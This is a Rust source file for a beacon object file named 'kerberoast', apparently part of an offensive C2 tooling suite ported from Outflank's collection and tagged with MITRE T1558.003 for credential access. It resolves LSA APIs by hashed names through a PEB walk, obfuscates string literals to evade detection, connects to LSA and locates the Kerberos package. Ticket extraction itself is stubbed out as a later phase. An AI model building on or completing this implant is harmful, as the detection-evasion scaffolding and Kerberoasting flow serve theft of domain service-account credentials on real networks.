// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Original C: Outflank/C2-Tool-Collection — kerberoast/
//
//! `kerberoast` — Kerberos TGS extraction via LSA SSPI.
//!
//! Connects to the LSA via LsaConnectUntrusted (secur32.dll) and
//! enumerates the Kerberos authentication package by name via
//! LsaLookupAuthenticationPackage. TGS ticket extraction for
//! offline cracking is deferred to Phase 5 (LsaCallAuthenticationPackage
//! with KerberosRetrieveEncodedTicketMessage).
//!
//! MITRE: T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting),
//!        tactic: Credential Access

#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use common::{mitre::Technique, obf};

const TECHNIQUES: &[Technique] = &[
    Technique {
        id:     "T1558.003",
        name:   "Steal or Forge Kerberos Tickets: Kerberoasting",
        tactic: "Credential Access",
    },
];

// ─── Precomputed API hashes — byte literals are compile-time-const only ───────
// API names must NOT appear as strings anywhere in .rdata; hash only.
const HASH_LSA_CONNECT_UNTRUSTED: u32 =
    common::hash::djb2(b"LsaConnectUntrusted");
const HASH_LSA_LOOKUP_AUTH_PKG: u32 =
    common::hash::djb2(b"LsaLookupAuthenticationPackage");

// Module hash (case-insensitive — loader stores mixed-case names)
const HASH_MOD_SECUR32: u32 =
    common::hash::djb2_case_insensitive(b"secur32.dll");

// ─── LSA_STRING (ANSI, byte-counted, used by LSA API) ─────────────────────────
#[repr(C)]
struct LsaString {
    length:     u16,   // byte count, excluding NUL
    max_length: u16,   // byte count of buffer
    buffer:     *const u8,
}

impl LsaString {
    /// Build a `LSA_STRING` pointing at `s` (must outlive the struct).
    fn from_bytes(s: &[u8]) -> Self {
        Self {
            length:     s.len() as u16,
            max_length: s.len() as u16,
            buffer:     s.as_ptr(),
        }
    }
}

// ─── Function-pointer type aliases ────────────────────────────────────────────
type FnLsaConnectUntrusted =
    unsafe extern "system" fn(lsa_handle: *mut usize) -> i32;

type FnLsaLookupAuthenticationPackage =
    unsafe extern "system" fn(
        lsa_handle:   usize,
        package_name: *const LsaString,
        auth_package: *mut u32,
    ) -> i32;

// ─── Entry point ──────────────────────────────────────────────────────────────

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(())  => {},
        Err(e)  => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    // ── Arg parsing: optional --spn <value> ──────────────────────────────────
    // rustbof provides argv via BeaconDataParse; simple scan for "--spn".
    let spn_opt: Option<&str> = parse_spn_arg();

    // ── DFR: locate secur32.dll via PEB walk ─────────────────────────────────
    let base = unsafe { common::dfr::resolve_api(HASH_MOD_SECUR32, HASH_LSA_CONNECT_UNTRUSTED) }
        .ok_or("module resolve failed")?;

    let fn_connect: FnLsaConnectUntrusted = unsafe { core::mem::transmute(base) };

    // ── LsaConnectUntrusted ───────────────────────────────────────────────────
    let mut lsa_handle: usize = 0;
    let status = unsafe { fn_connect(&mut lsa_handle) };
    if status != 0 || lsa_handle == 0 {
        return Err("LSA connect failed");
    }

    // ── DFR: resolve LsaLookupAuthenticationPackage ───────────────────────────
    let pkg_ptr = unsafe {
        common::dfr::resolve_api(HASH_MOD_SECUR32, HASH_LSA_LOOKUP_AUTH_PKG)
    }.ok_or("pkg resolve failed")?;

    let fn_lookup: FnLsaLookupAuthenticationPackage =
        unsafe { core::mem::transmute(pkg_ptr) };

    // ── LsaLookupAuthenticationPackage: locate Kerberos package ──────────────
    // Package name is an obfuscated literal; LsaString points to the stack buffer.
    obf! { let krb_name = "Kerberos"; }
    let pkg_name_str = LsaString::from_bytes(krb_name.as_bytes());
    let mut auth_package: u32 = 0;
    let status2 = unsafe { fn_lookup(lsa_handle, &pkg_name_str, &mut auth_package) };
    if status2 != 0 {
        return Err("pkg lookup failed");
    }

    println!(
        "[*] kerberoast: LSA connected, Kerberos package found (id: {})",
        auth_package
    );

    if let Some(spn) = spn_opt {
        println!("[*] kerberoast: target SPN: {}", spn);
    }

    println!("[*] kerberoast: ticket extraction deferred (Phase 5)");

    Ok(())
}

// ─── Minimal argv parser ───────────────────────────────────────────────────────
// In a BOF context `rustbof` delivers arguments via BeaconDataParse.
// This stub performs a simple scan over a static arg slice if available.
// Returns Some(spn) if `--spn <value>` is found, else None.
fn parse_spn_arg() -> Option<&'static str> {
    // Phase 5: wire up BeaconDataParse once arg infrastructure is finalised.
    // For now the stub reports no SPN so the LSA flow can be exercised in isolation.
    None
}
